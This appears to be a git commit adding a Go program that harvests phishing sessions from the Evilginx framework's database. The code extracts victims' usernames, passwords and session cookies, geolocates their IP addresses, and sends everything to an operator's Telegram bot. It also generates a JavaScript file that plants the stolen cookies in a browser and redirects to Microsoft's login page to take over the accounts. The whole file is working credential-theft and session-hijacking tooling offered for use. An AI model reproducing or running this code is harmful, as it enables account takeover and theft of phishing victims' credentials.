9e010d53a07b51bb763d107b67c0797a25c9dc2d
shareblux <117932956+shareblux@users.noreply.github.com>
2025-05-01 18:17:42 +0300

    Create export_sessions.go

---
+++ export_sessions.go
@@ -0,0 +1,224 @@
+package main
+
+import (
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"io"
+	"io/ioutil"
+	"mime/multipart"
+	"net/http"
+	"os"
+	"strings"
+	"time"
+
+	"github.com/tidwall/buntdb"
+)
+
+const (
+	dbPath           = "/root/.evilginx/data.db"
+	sentFile         = "/root/.evilginx/sent_sessions.json"
+	telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
+	telegramChatID   = "YOUR_CHAT_ID"
+)
+
+type Session struct {
+	Id           int                                 `json:"id"`
+	Phishlet     string                              `json:"phishlet"`
+	LandingURL   string                              `json:"landing_url"`
+	Username     string                              `json:"username"`
+	Password     string                              `json:"password"`
+	Custom       map[string]string                   `json:"custom"`
+	BodyTokens   map[string]string                   `json:"body_tokens"`
+	HttpTokens   map[string]string                   `json:"http_tokens"`
+	Tokens       map[string]map[string]*CookieToken  `json:"tokens"`
+	SessionId    string                              `json:"session_id"`
+	UserAgent    string                              `json:"useragent"`
+	RemoteAddr   string                              `json:"remote_addr"`
+	CreateTime   int64                               `json:"create_time"`
+	UpdateTime   int64                               `json:"update_time"`
+}
+
+type CookieToken struct {
+	Name     string `json:"name"`
+	Value    string `json:"value"`
+	Path     string `json:"path"`
+	HttpOnly bool   `json:"httpOnly"`
+}
+
+func main() {
+	sent := loadSent()
+	for {
+		newSent := checkAndSendNewSessions(sent)
+		if len(newSent) > 0 {
+			for _, id := range newSent {
+				sent[id] = true
+			}
+			saveSent(sent)
+		}
+		time.Sleep(60 * time.Second)
+	}
+}
+
+func loadSent() map[int]bool {
+	sent := make(map[int]bool)
+	data, err := ioutil.ReadFile(sentFile)
+	if err == nil {
+		_ = json.Unmarshal(data, &sent)
+	}
+	return sent
+}
+
+func saveSent(sent map[int]bool) {
+	data, _ := json.MarshalIndent(sent, "", "  ")
+	_ = ioutil.WriteFile(sentFile, data, 0644)
+}
+
+func checkAndSendNewSessions(sent map[int]bool) []int {
+	db, err := buntdb.Open(dbPath)
+	if err != nil {
+		fmt.Println("Failed to open DB:", err)
+		return nil
+	}
+	defer db.Close()
+
+	var newSent []int
+	db.View(func(tx *buntdb.Tx) error {
+		tx.AscendKeys("sessions:*", func(key, val string) bool {
+			var s Session
+			if err := json.Unmarshal([]byte(val), &s); err == nil {
+				if !sent[s.Id] && (s.Username != "" || len(s.Tokens) > 0) {
+					fmt.Println("New session to send:", s.Id)
+					err := sendToTelegram(s)
+					if err == nil {
+						newSent = append(newSent, s.Id)
+					}
+				}
+			}
+			return true
+		})
+		return nil
+	})
+	return newSent
+}
+
+func getIPLocation(ip string) string {
+	resp, err := http.Get("https://ipinfo.io/" + ip + "/json")
+	if err != nil {
+		return "Unknown"
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "Unknown"
+	}
+
+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return "Unknown"
+	}
+
+	return fmt.Sprintf("%v, %v, %v (%v)", result["city"], result["region"], result["country"], result["org"])
+}
+
+func sendToTelegram(s Session) error {
+	location := getIPLocation(s.RemoteAddr)
+
+	msg := fmt.Sprintf(
+		`📥 New OFFICE COOKIES LOG #%d
+
+Username: %s
+Password: %s
+cookie link: %s
+IP: %s
+Location: %s
+UserAgent: %s
+CLICKED ON: %s
+submitted log on: %s`,
+		s.Id, s.Username, s.Password, s.LandingURL,
+		s.RemoteAddr, location, s.UserAgent,
+		time.Unix(s.CreateTime, 0).Format(time.RFC1123),
+		time.Unix(s.UpdateTime, 0).Format(time.RFC1123),
+	)
+
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
+	_, err := http.PostForm(url, map[string][]string{
+		"chat_id": {telegramChatID},
+		"text":    {msg},
+	})
+	if err != nil {
+		fmt.Println("Failed to send TG message:", err)
+		return err
+	}
+
+	jsCode := generateInjectionJS(s)
+	username := s.Username
+	if username == "" {
+		username = "no_username"
+	}
+	filename := fmt.Sprintf("/tmp/session_%d_%s.txt", s.Id, strings.ReplaceAll(username, "@", "_"))
+	_ = os.WriteFile(filename, []byte(jsCode), 0644)
+	defer os.Remove(filename)
+
+	return sendTelegramFile(filename)
+}
+
+func sendTelegramFile(filepath string) error {
+	file, err := os.Open(filepath)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	var b bytes.Buffer
+	w := multipart.NewWriter(&b)
+	_ = w.WriteField("chat_id", telegramChatID)
+
+	part, _ := w.CreateFormFile("document", filepath[strings.LastIndex(filepath, "/")+1:])
+	_, _ = io.Copy(part, file)
+	w.Close()
+
+	req, _ := http.NewRequest("POST", fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramBotToken), &b)
+	req.Header.Set("Content-Type", w.FormDataContentType())
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("File send error:", err)
+		return err
+	}
+	defer resp.Body.Close()
+	return nil
+}
+
+func generateInjectionJS(s Session) string {
+	cookies := []map[string]interface{}{}
+	for domain, domainCookies := range s.Tokens {
+		for _, token := range domainCookies {
+			cookies = append(cookies, map[string]interface{}{
+				"name":     token.Name,
+				"value":    token.Value,
+				"domain":   domain,
+				"path":     token.Path,
+				"httpOnly": token.HttpOnly,
+				"secure":   true,
+				"sameSite": "none",
+				"session":  true,
+				"storeId":  nil,
+			})
+		}
+	}
+
+	jsonCookies, _ := json.Marshal(cookies)
+
+	return fmt.Sprintf(`let ipaddress = "%s";
+let email = "%s";
+let password = "%s";
+!function(){
+let e = %s;
+for(let o of e)
+document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?(o.path?"":"path=/")+";":""}Secure;SameSite=None\`;
+window.location.href="https://login.microsoftonline.com"
+}();`, s.RemoteAddr, s.Username, s.Password, string(jsonCookies))
+}
